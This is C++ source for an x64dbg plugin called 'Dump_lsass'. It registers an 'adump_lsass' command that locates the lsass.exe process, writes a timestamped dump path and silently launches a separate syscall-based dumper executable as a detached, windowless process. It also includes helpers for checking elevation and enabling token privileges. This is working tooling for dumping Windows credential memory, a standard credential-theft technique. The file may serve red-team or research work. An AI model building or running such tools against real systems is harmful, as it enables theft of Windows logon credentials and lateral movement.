#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <sstream>
#include <vector>
#include <shlwapi.h>
#include <shellapi.h>
#include "pluginmain.h"

#pragma comment(lib, "Shlwapi.lib")

#define PLUGIN_NAME "Dump_lsass"
#define PLUGIN_VERSION 1

static HMODULE g_hModule = NULL;
static int g_pluginHandle = 0;

// Forward declarations of plugin exports
extern "C" __declspec(dllexport) bool pluginit(PLUG_INITSTRUCT* initStruct);
extern "C" __declspec(dllexport) bool plugstop();
extern "C" __declspec(dllexport) void plugsetup(PLUG_SETUPSTRUCT* setupStruct);

// Helper: log to x64dbg
static void Log(const char* fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    char buffer[2048];
    _vsnprintf_s(buffer, sizeof(buffer), _TRUNCATE, fmt, args);
    va_end(args);
    
    char finalBuffer[2100];
    sprintf_s(finalBuffer, "[%s] %s", PLUGIN_NAME, buffer);
    _plugin_logputs(finalBuffer);
}

// Check elevation
static bool IsElevated()
{
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
        {
            fRet = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fRet == TRUE;
}

// Attempt to enable a privilege in the current process token. Returns true on success.
static bool EnablePrivilege(LPCTSTR privilegeName)
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        DWORD err = GetLastError();
        Log("EnablePrivilege: OpenProcessToken failed: %u\n", err);
        return false;
    }

    TOKEN_PRIVILEGES tp = {0};
    LUID luid;
    if (!LookupPrivilegeValue(NULL, privilegeName, &luid))
    {
        DWORD err = GetLastError();
        Log("EnablePrivilege: LookupPrivilegeValue failed for %s: %u\n", privilegeName, err);
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
    {
        DWORD err = GetLastError();
        Log("EnablePrivilege: AdjustTokenPrivileges failed for %s: %u\n", privilegeName, err);
        CloseHandle(hToken);
        return false;
    }

    DWORD err = GetLastError();
    if (err != ERROR_SUCCESS)
    {
        Log("EnablePrivilege: AdjustTokenPrivileges did not succeed for %s: %u\n", privilegeName, err);
        CloseHandle(hToken);
        return false;
    }

    Log("EnablePrivilege: %s enabled successfully.\n", privilegeName);
    CloseHandle(hToken);
    return true;
}


// Find lsass.exe PID
static DWORD FindLsassPid()
{
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;
    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe))
    {
        do
        {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0)
            {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

// Get directory of plugin DLL
static std::string GetPluginDir()
{
    char buf[MAX_PATH] = {0};
    if (GetModuleFileNameA(g_hModule, buf, MAX_PATH))
    {
        PathRemoveFileSpecA(buf);
        return std::string(buf);
    }
    return std::string();
}

// Command callback
static bool cbAdumpCommand(int argc, char* argv[])
{
    std::string exePath;
    std::string outputPath;
    DWORD pid = 0;

    // --- Argument parsing (same as before) ---
    if (argc == 1)
    {
        std::string dir = GetPluginDir();
        exePath = dir + "\\LsassDumpSyscall.exe";
        outputPath = dir + "\\lsass.dmp";
        pid = FindLsassPid();
        if (pid == 0) { Log("failed to find lsass.exe PID.\n"); return false; }
    }
    else if (argc == 2)
    {
        std::string dir = GetPluginDir();
        exePath = dir + "\\LsassDumpSyscall.exe";
        outputPath = argv[1];
        pid = FindLsassPid();
        if (pid == 0) { Log("failed to find lsass.exe PID.\n"); return false; }
    }
    else
    {
        exePath = argv[1];
        pid = (DWORD)strtoul(argv[2], NULL, 10);
        outputPath = argv[3];
        if (pid == 0) { Log("invalid PID.\n"); return false; }
    }

    if (!PathFileExistsA(exePath.c_str()))
    {
        Log("dumper EXE not found: %s\n", exePath.c_str());
        return false;
    }

    // Build command line (params only!)
    // get high-precision system time (FILETIME: 100-ns since 1601)
    FILETIME ft;
    typedef void (WINAPI *GetSystemTimePreciseAsFileTime_t)(LPFILETIME);
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    auto pGetPrecise = hKernel ? (GetSystemTimePreciseAsFileTime_t)GetProcAddress(hKernel, "GetSystemTimePreciseAsFileTime") : nullptr;
    if (pGetPrecise)
        pGetPrecise(&ft);
    else
        GetSystemTimeAsFileTime(&ft);

    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;
    const uint64_t EPOCH_DIFF = 116444736000000000ULL; // to convert FILETIME to Unix epoch (100-ns)
    uint64_t ticks100ns = uli.QuadPart;
    uint64_t us = 0;
    if (ticks100ns > EPOCH_DIFF) us = (ticks100ns - EPOCH_DIFF) / 10; // microseconds since epoch

    time_t secs = (time_t)(us / 1000000ULL);
    unsigned int usec = (unsigned int)(us % 1000000ULL);

    struct tm tmLocal;
    localtime_s(&tmLocal, &secs);

    char tsBuf[64];
    sprintf_s(tsBuf, sizeof(tsBuf), "%04d%02d%02d_%02d%02d%02d_%06u",
              tmLocal.tm_year + 1900, tmLocal.tm_mon + 1, tmLocal.tm_mday,
              tmLocal.tm_hour, tmLocal.tm_min, tmLocal.tm_sec, usec);

    // insert timestamp before extension (or append if none)
    std::string out = outputPath;
    size_t lastSlash = out.find_last_of("\\/");
    size_t dot = out.find_last_of('.');
    if (dot != std::string::npos && (lastSlash == std::string::npos || dot > lastSlash)) {
        out.insert(dot, std::string("_") + tsBuf);
    } else {
        out += "_" + std::string(tsBuf);
    }

    std::string params = std::to_string(pid) + " \"" + out + "\"";
    std::vector<char> cmdBuf(params.begin(), params.end());
    cmdBuf.push_back('\0');

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };

    Log("Launching dumper (non-blocking): %s %s\n", exePath.c_str(), params.c_str());

    BOOL ok = CreateProcessA(
        exePath.c_str(),    // lpApplicationName
        cmdBuf.data(),      // lpCommandLine (writable)
        NULL, NULL, FALSE,
        DETACHED_PROCESS | CREATE_NO_WINDOW,   // or CREATE_NEW_CONSOLE if you want a visible window
        NULL, NULL,
        &si, &pi);

    if (!ok)
    {
        Log("CreateProcess failed. Error: %u\n", GetLastError());
        return false; // Choice B -> script stops
    }

    // detach immediately -> NO WAITING
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Log("dumper started successfully — continuing without waiting.\n");
    return true; // script continues
}


// Plugin initialization
bool pluginit(PLUG_INITSTRUCT* initStruct)
{
    initStruct->sdkVersion = PLUG_SDKVERSION;
    initStruct->pluginVersion = PLUGIN_VERSION;
    strcpy_s(initStruct->pluginName, sizeof(initStruct->pluginName), PLUGIN_NAME);
    
    g_pluginHandle = initStruct->pluginHandle;
    
    _plugin_registercommand(g_pluginHandle, "adump_lsass", cbAdumpCommand, false);
    Log("plugin initialized.\n");
    return true;
}

// Plugin cleanup
bool plugstop()
{
    Log("plugin stopping.\n");
    return true;
}

// Plugin setup (UI, etc)
void plugsetup(PLUG_SETUPSTRUCT* setupStruct)
{
    // no UI setup needed
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    switch (reason)
    {
        case DLL_PROCESS_ATTACH:
            g_hModule = hModule;
            break;
    }
    return TRUE;
}
